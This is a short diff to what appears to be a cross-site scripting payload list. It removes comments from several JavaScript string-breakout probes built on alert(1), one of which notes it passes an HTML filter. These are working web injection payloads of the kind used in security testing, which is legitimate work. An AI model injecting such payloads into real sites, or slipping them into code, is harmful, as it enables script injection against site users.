@@ -56,9 +56,9 @@ javascript:void(alert(1))
 
 ";alert(1);//         
 '+alert(1)+'         
-'-alert(1)-'         // works too
-"/1/+alert(1)//      // division with alert
-"/a/+alert(1)//      // forces type coercion
-"+alert(1)+""        // string concat, safe from HTML filter
+'-alert(1)-'         
+"/1/+alert(1)//      
+"/a/+alert(1)//     
+"+alert(1)+""        
 "+alert(String.fromCharCode(88,83,83))+"
 
